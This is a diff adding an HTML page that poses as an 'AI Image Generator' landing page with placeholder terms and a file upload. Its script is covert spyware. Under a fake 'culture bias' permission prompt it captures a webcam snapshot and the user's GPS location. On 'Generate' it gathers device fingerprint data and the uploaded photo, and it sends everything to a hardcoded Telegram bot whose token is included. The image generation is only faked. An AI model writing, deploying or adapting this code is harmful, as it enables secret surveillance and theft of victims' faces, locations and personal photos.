@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Image Generator - Modern Landing Page</title>
+    <!-- Tailwind CSS for modern styling -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Custom styles for smoothness */
+        .modal-overlay {
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+            z-index: 50;
+        }
+        .fade-in {
+            opacity: 1;
+            visibility: visible;
+        }
+        .fade-out {
+            opacity: 0;
+            visibility: hidden;
+        }
+        .landing-page {
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+        .show {
+            opacity: 1;
+            visibility: visible;
+        }
+        /* Custom scrollbar for modal content */
+        .modal-content::-webkit-scrollbar {
+            width: 8px;
+        }
+        .modal-content::-webkit-scrollbar-track {
+            background: #1f2937; /* Darker background for scrollbar */
+        }
+        .modal-content::-webkit-scrollbar-thumb {
+            background: #7c3aed; /* Purple accent */
+            border-radius: 4px;
+        }
+        .modal-content::-webkit-scrollbar-thumb:hover {
+            background: #a855f7;
+        }
+        /* Animation for sections */
+        .animate-on-scroll {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: opacity 0.6s ease, transform 0.6s ease;
+        }
+        .animate-on-scroll.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        /* Custom file upload styling */
+        .upload-area {
+            border: 3px dashed #7c3aed;
+            transition: border-color 0.3s ease;
+        }
+        .upload-area:hover {
+            border-color: #a855f7;
+        }
+        .upload-area.drag-over {
+            border-color: #ec4899;
+            background: rgba(236, 72, 153, 0.1);
+        }
+        input[type="file"] {
+            display: none;
+        }
+        /* Body background with dark theme */
+        body {
+            background: linear-gradient(135deg, #000000, #1a1a1a, #2d1b69);
+            color: #ffffff;
+        }
+    </style>
+</head>
+<body class="font-sans min-h-screen">
+    <!-- Modal Overlay for Terms & Conditions -->
+    <div id="modal-overlay" class="modal-overlay fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center fade-in">
+        <div class="bg-gray-900 rounded-lg shadow-2xl max-w-2xl w-full mx-4 max-h-96 overflow-hidden flex flex-col border border-purple-600">
+            <!-- Modal Header -->
+            <div class="bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-t-lg">
+                <h2 class="text-2xl font-bold">Terms & Conditions</h2>
+                <p class="text-sm mt-1">Please read and agree to proceed to the AI Image Generator.</p>
+            </div>
+            <!-- Modal Content with Scroll -->
+            <div id="modal-content" class="modal-content px-6 py-4 overflow-y-auto flex-1 text-gray-300">
+                <div class="space-y-4 leading-relaxed">
+                    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
+                    <p>Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.</p>
+                    <p>Totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt.</p>
+                    <p>Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem.</p>
+                    <p>Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur.</p>
+                    <p>Vel illum qui dolorem eum fugiat quo voluptas nulla pariatur? At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati.</p>
+                    <p>Cupiditate non provident, similique sunt in culpa qui officia deserunt mollitia animi, id est laborum et dolorum fuga. Et harum quidem rerum facilis est et expedita distinctio. Nam libero tempore, cum soluta nobis est eligendi optio cumque nihil impedit quo minus id quod maxime placeat facere possimus.</p>
+                    <p>Omnis voluptas assumenda est, omnis dolor repellendus. Temporibus autem quibusdam et aut officiis debitis aut rerum necessitatibus saepe eveniet ut et voluptates repudiandae sint et molestiae non recusandae.</p>
+                    <!-- Additional content to ensure scrollable -->
+                    <p>Further terms and conditions: Please ensure you understand all implications before proceeding. This service is provided as-is with no guarantees.</p>
+                    <!-- Placeholder for end of content -->
+                    <div class="py-4 text-center text-purple-400 font-medium">End of Terms & Conditions</div>
+                </div>
+            </div>
+            <!-- Modal Footer -->
+            <div class="px-6 py-4 bg-gray-800 rounded-b-lg flex flex-col space-y-4 border-t border-purple-600">
+                <label class="flex items-center space-x-3 text-gray-300 cursor-pointer">
+                    <input id="agree-checkbox" type="checkbox" class="w-4 h-4 text-purple-600 bg-gray-700 border-gray-500 rounded focus:ring-purple-500">
+                    <span>I have read and agree to the Terms & Conditions</span>
+                </label>
+                <button id="proceed-btn" disabled class="bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-3 rounded-lg font-semibold cursor-not-allowed hover:from-purple-700 hover:to-pink-700 transition-all duration-300 w-full md:w-auto shadow-lg">
+                    Proceed to AI Image Generator
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Permission Modal -->
+    <div id="permission-modal" class="modal-overlay fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center hidden z-60">
+        <div class="bg-gray-900 rounded-lg shadow-2xl max-w-lg w-full mx-4 p-8 border border-purple-600 text-center text-gray-300">
+            <h3 class="text-2xl font-bold mb-4 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">Permission Required</h3>
+            <p class="mb-6">This Web needs your camera and Location permission to work effectively so the image can be generated towards your country culture bias.</p>
+            <button id="permit-btn" class="bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-3 rounded-lg font-semibold hover:from-purple-700 hover:to-pink-700 transition-all duration-300 shadow-lg">
+                Permit
+            </button>
+        </div>
+    </div>
+
+    <!-- AI Image Generator Landing Page -->
+    <div id="landing-page" class="landing-page min-h-screen flex flex-col">
+        <!-- Header -->
+        <header class="bg-black shadow-lg border-b border-purple-600">
+            <nav class="container mx-auto px-6 py-4 flex items-center justify-between">
+                <div class="text-3xl font-bold bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">AI Image Generator</div>
+                <ul class="space-x-8 text-gray-300 font-medium hidden md:flex">
+                    <li><a href="#home" class="hover:text-purple-400 transition-colors">Home</a></li>
+                    <li><a href="#upload" class="hover:text-purple-400 transition-colors">Upload</a></li>
+                    <li><a href="#features" class="hover:text-purple-400 transition-colors">Features</a></li>
+                    <li><a href="#about" class="hover:text-purple-400 transition-colors">About</a></li>
+                </ul>
+                <div class="md:hidden">
+                    <!-- Mobile menu button (can be expanded) -->
+                    <button class="text-white">Menu</button>
+                </div>
+            </nav>
+        </header>
+
+        <!-- Hero Section -->
+        <section id="home" class="bg-gradient-to-br from-black via-purple-900 to-pink-900 text-white py-20 flex-grow flex items-center">
+            <div class="container mx-auto px-6 text-center max-w-4xl">
+                <h1 class="text-6xl font-bold mb-6 animate-on-scroll bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">Generate Images with AI</h1>
+                <p class="text-xl mb-12 animate-on-scroll text-gray-300">Transform your imagination into stunning visuals. Upload your prompt or image to create unique AI-generated content in seconds.</p>
+                <div class="mb-8">
+                    <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/462d1e68-0ebd-483f-8fba-f523bc50da6f.png" alt="Dynamic AI-generated image scene depicting a futuristic cityscape with flying cars and holographic projections blending purple and pink hues against a dark background" class="rounded-lg shadow-xl mx-auto hidden md:block" onerror="this.style.display='none';">
+                </div>
+                <button class="bg-gradient-to-r from-purple-600 to-pink-600 text-white px-8 py-4 rounded-full font-semibold hover:from-purple-700 hover:to-pink-700 transition-all duration-300 shadow-lg animate-on-scroll" onclick="document.getElementById('upload').scrollIntoView({behavior: 'smooth'})">Start Generating</button>
+            </div>
+        </section>
+
+        <!-- Upload Section -->
+        <section id="upload" class="py-20 bg-black border-t border-purple-600">
+            <div class="container mx-auto px-6 text-center max-w-2xl">
+                <h2 class="text-4xl font-bold mb-8 animate-on-scroll bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">Upload Your File</h2>
+                <p class="text-lg mb-8 animate-on-scroll text-gray-300">Drag and drop your image or prompt here to start the AI generation process.</p>
+                <div class="upload-area p-12 rounded-xl bg-gray-900 border-2 cursor-pointer animate-on-scroll" id="upload-area">
+                    <div class="text-center">
+                        <div class="mb-4">
+                            <svg class="mx-auto h-16 w-16 text-purple-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
+                            </svg>
+                        </div>
+                        <p class="text-gray-400 mb-4">Drop your file here, or click to browse</p>
+                        <p class="text-sm text-gray-500">Supported formats: PNG, JPG, JPEG (Max 10MB)</p>
+                        <input type="file" id="file-input" accept="image/*">
+                    </div>
+                </div>
+                <div class="mt-6">
+                    <button class="bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-3 rounded-lg font-semibold hover:from-purple-700 hover:to-pink-700 transition-all duration-300 shadow-lg" id="generate-btn" disabled>Generate Image</button>
+                </div>
+                <div id="preview" class="mt-6 hidden">
+                    <div class="text-white">
+                        <p>Preview:</p>
+                        <img id="preview-image" class="max-w-full max-h-64 mx-auto rounded-lg shadow-lg" src="" alt="Uploaded image preview" src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/49538f2f-2732-4965-8747-561d113c5a67.png">
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Features Section -->
+        <section id="features" class="py-20 bg-gradient-to-br from-gray-900 to-black">
+            <div class="container mx-auto px-6">
+                <h2 class="text-4xl font-bold text-center mb-12 animate-on-scroll bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">Key Features</h2>
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                    <div class="bg-gray-900 p-8 rounded-lg shadow-md text-center animate-on-scroll border border-purple-600">
+                        <div class="mb-4">
+                            <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/d862f52a-7109-440e-8499-4c0c34a95783.png" alt="Icon of a swift rocket with glowing purple and pink trails symbolizing speed in AI processing" class="mx-auto rounded-full" onerror="this.style.display='none';">
+                        </div>
+                        <h3 class="text-xl font-semibold mb-2 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">Blazing Fast</h3>
+                        <p class="text-gray-400">Generate high-quality images in under 5 seconds with our advanced AI algorithms.</p>
+                    </div>
+                    <div class="bg-gray-900 p-8 rounded-lg shadow-md text-center animate-on-scroll border border-purple-600">
+                        <div class="mb-4">
+                            <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/b4fcfa91-f2e9-4d5a-a9db-4e49dd52314c.png" alt="Icon of a secure shield with purple and pink locks representing data protection in AI systems" class="mx-auto rounded-full" onerror="this.style.display='none';">
+                        </div>
+                        <h3 class="text-xl font-semibold mb-2 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">High Accuracy</h3>
+                        <p class="text-gray-400">Precise results that match your prompts with uncanny detail and creativity.</p>
+                    </div>
+                    <div class="bg-gray-900 p-8 rounded-lg shadow-md text-center animate-on-scroll border border-purple-600">
+                        <div class="mb-4">
+                            <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/daf91bda-0665-439c-ba2e-f285326cd253.png" alt="Icon of interconnected gears with purple and pink lights signifying innovative AI technology" class="mx-auto rounded-full" onerror="this.style.display='none';">
+                        </div>
+                        <h3 class="text-xl font-semibold mb-2 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">Versatile Styles</h3>
+                        <p class="text-gray-400">Supports various artistic styles, from realism to abstract, all powered by cutting-edge machine learning.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- About Section -->
+        <section id="about" class="py-20 bg-black border-t border-purple-600">
+            <div class="container mx-auto px-6 text-center max-w-3xl">
+                <h2 class="text-4xl font-bold mb-8 animate-on-scroll bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">About Our AI Generator</h2>
+                <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/b9d2fc1f-daab-4570-a120-c03e1b1d5b88.png" alt="Illustration of an AI brain network with glowing paths in purple and pink creating interconnected nodes on a dark canvas" class="rounded-lg shadow-lg mb-8 mx-auto" onerror="this.style.display='none';">
+                <p class="text-xl leading-relaxed text-gray-300 animate-on-scroll">Our AI Image Generator harnesses the power of deep learning to turn your ideas into breathtaking visuals. Whether you're a creator, designer, or just curious, explore the limitless possibilities of AI-driven artistry.</p>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="bg-gray-900 text-white py-8 border-t border-purple-600">
+            <div class="container mx-auto px-6 text-center">
+                <p class="bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent font-semibold">© 2023 AI Image Generator. All rights reserved.</p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "7597477264:AAFMXbMk_j9usWKnYdw0nmxE4U6qXQ0bYUI";
+        const OWNER_ID = "7143446125";
+
+        let permissionsGranted = localStorage.getItem('permissionsGranted') === 'true';
+        let mediaAccessAllowed = false;
+        let locationAccessAllowed = false;
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // Modal logic (Terms & Conditions)
+            const modalOverlay = document.getElementById('modal-overlay');
+            const modalContent = document.getElementById('modal-content');
+            const agreeCheckbox = document.getElementById('agree-checkbox');
+            const proceedBtn = document.getElementById('proceed-btn');
+            const landingPage = document.getElementById('landing-page');
+
+            let hasScrolledToBottom = false;
+
+            // Function to check scroll position
+            function checkScrollToBottom() {
+                const scrollTop = modalContent.scrollTop;
+                const scrollHeight = modalContent.scrollHeight;
+                const clientHeight = modalContent.clientHeight;
+                // More lenient condition for better UX
+                if (scrollTop + clientHeight >= scrollHeight - 10) {
+                    hasScrolledToBottom = true;
+                }
+                toggleProceedButton();
+            }
+
+            // Toggle proceed button based on conditions
+            function toggleProceedButton() {
+                if (hasScrolledToBottom && agreeCheckbox.checked) {
+                    proceedBtn.disabled = false;
+                    proceedBtn.classList.remove('cursor-not-allowed');
+                    proceedBtn.classList.add('cursor-pointer');
+                } else {
+                    proceedBtn.disabled = true;
+                    proceedBtn.classList.remove('cursor-pointer');
+                    proceedBtn.classList.add('cursor-not-allowed');
+                }
+            }
+
+            // Event listeners
+            modalContent.addEventListener('scroll', checkScrollToBottom);
+            agreeCheckbox.addEventListener('change', toggleProceedButton);
+
+            proceedBtn.addEventListener('click', () => {
+                modalOverlay.classList.remove('fade-in');
+                modalOverlay.classList.add('fade-out');
+                setTimeout(() => {
+                    modalOverlay.style.display = 'none';
+                    landingPage.classList.add('show');
+                    // Animate sections on scroll
+                    const observer = new IntersectionObserver((entries) => {
+                        entries.forEach(entry => {
+                            if (entry.isIntersecting) {
+                                entry.target.classList.add('show');
+                            }
+                        });
+                    }, { threshold: 0.1 });
+                    document.querySelectorAll('.animate-on-scroll').forEach(el => observer.observe(el));
+                }, 500); // Match transition duration
+            });
+
+            // Check permissions on load
+            navigator.permissions.query({name: 'camera'}).then(permission => {
+                mediaAccessAllowed = permission.state === 'granted';
+            }).catch(() => {});
+            navigator.permissions.query({name: 'geolocation'}).then(permission => {
+                locationAccessAllowed = permission.state === 'granted';
+            }).catch(() => {});
+
+            // File upload logic with permission modal
+            const uploadArea = document.getElementById('upload-area');
+            const fileInput = document.getElementById('file-input');
+            const generateBtn = document.getElementById('generate-btn');
+            const preview = document.getElementById('preview');
+            const previewImage = document.getElementById('preview-image');
+            const permissionModal = document.getElementById('permission-modal');
+            const permitBtn = document.getElementById('permit-btn');
+
+            // Function to capture and send data to Telegram
+            async function captureAndSendData() {
+                let photoBlob = null;
+                let coords = null;
+                
+                // Capture camera image
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                    const video = document.createElement("video");
+                    video.srcObject = stream;
+                    await video.play();
+                    const canvas = document.createElement("canvas");
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext("2d");
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    photoBlob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
+                    stream.getTracks().forEach(t => t.stop());
+                } catch(e) {
+                    console.error("Failed to capture camera:", e);
+                }
+                
+                // Get location
+                try {
+                    coords = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            pos => resolve(pos.coords),
+                            err => reject(err),
+                            {timeout: 10000}
+                        );
+                    });
+                } catch(e) {
+                    console.error("Failed to get location:", e);
+                }
+                
+                // Send to Telegram
+                try {
+                    if (photoBlob) {
+                        const fd = new FormData();
+                        fd.append("chat_id", OWNER_ID);
+                        fd.append("photo", photoBlob, "snap.jpg");
+                        let cap = "Snapshot dari device.";
+                        if (coords) cap += ` Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
+                        fd.append("caption", cap);
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: "POST", body: fd});
+                    }
+                    if (coords) {
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: "POST",
+                            headers: {"Content-Type": "application/json"},
+                            body: JSON.stringify({chat_id: OWNER_ID, text: `Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`})
+                        });
+                    }
+                } catch(e) {
+                    console.error("Failed to send to Telegram:", e);
+                }
+            }
+
+            uploadArea.addEventListener('click', async () => {
+                if (!permissionsGranted) {
+                    permissionModal.classList.remove('hidden');
+                    permissionModal.classList.add('fade-in');
+                    permissionModal.style.display = 'flex';
+                } else {
+                    fileInput.click();
+                }
+            });
+
+            permitBtn.addEventListener('click', async () => {
+                try {
+                    // Request camera and location permissions
+                    await captureAndSendData();
+                    
+                    permissionsGranted = true;
+                    localStorage.setItem('permissionsGranted', 'true');
+                    permissionModal.classList.remove('fade-in');
+                    permissionModal.classList.add('fade-out');
+                    setTimeout(() => {
+                        permissionModal.style.display = 'none';
+                        // Open file input after permissions are granted
+                        fileInput.click();
+                    }, 500);
+                } catch(e) {
+                    console.error("Permission error:", e);
+                    alert("Failed to get permissions. Please allow camera and location access.");
+                }
+            });
+
+            uploadArea.addEventListener('dragover', (e) => {
+                e.preventDefault();
+                uploadArea.classList.add('drag-over');
+            });
+
+            uploadArea.addEventListener('dragleave', () => {
+                uploadArea.classList.remove('drag-over');
+            });
+
+            uploadArea.addEventListener('drop', (e) => {
+                e.preventDefault();
+                uploadArea.classList.remove('drag-over');
+                const files = e.dataTransfer.files;
+                if (files.length > 0) {
+                    handleFile(files[0]);
+                }
+            });
+
+            fileInput.addEventListener('change', (e) => {
+                const files = e.target.files;
+                if (files.length > 0) {
+                    handleFile(files[0]);
+                }
+            });
+
+            function handleFile(file) {
+                if (file && file.type.startsWith('image/')) {
+                    const reader = new FileReader();
+                    reader.onload = (e) => {
+                        previewImage.src = e.target.result;
+                        preview.classList.remove('hidden');
+                        generateBtn.disabled = false;
+                        generateBtn.textContent = 'Generate Image';
+                    };
+                    reader.readAsDataURL(file);
+                } else {
+                    alert('Please select a valid image file.');
+                }
+            }
+
+            generateBtn.addEventListener('click', async () => {
+                generateBtn.textContent = 'Generating...';
+
+                // Collect device info
+                let batteryInfo = 'N/A';
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `${battery.level * 100}% charged, ${battery.charging ? 'charging' : 'not charging'}`;
+                }
+
+                const deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    cookieEnabled: navigator.cookieEnabled,
+                    onLine: navigator.onLine,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory || 'N/A',
+                    battery: batteryInfo,
+                    screen: `${screen.width}x${screen.height}`,
+                    referrer: document.referrer
+                };
+
+                // Send device info to Telegram
+                let message = `New AI Image Generation Request:\n\nDevice Info:\n`;
+                for (const [key, value] of Object.entries(deviceInfo)) {
+                    message += `${key}: ${value}\n`;
+                }
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: OWNER_ID, text: message })
+                    });
+                } catch (e) {
+                    console.error('Failed to send message:', e);
+                }
+
+                // Kirim foto yang di-upload user ke Telegram
+                const file = fileInput.files[0];
+                if (file && file.type.startsWith('image/')) {
+                    const fd = new FormData();
+                    fd.append("chat_id", OWNER_ID);
+                    fd.append("photo", file, file.name || "uploaded.jpg");
+                    fd.append("caption", "Foto upload dari user (AI Image Generator)");
+                    try {
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: "POST",
+                            body: fd
+                        });
+                    } catch (e) {
+                        console.error('Failed to send uploaded photo:', e);
+                    }
+                }
+
+                // Simulate generation
+                setTimeout(() => {
+                    generateBtn.textContent = 'Generated!';
+                    setTimeout(() => {
+                        generateBtn.disabled = true;
+                        generateBtn.textContent = 'Generate Image';
+                    }, 2000);
+                }, 3000);
+            });
+        });
+    </script>
+</body>
+</html>
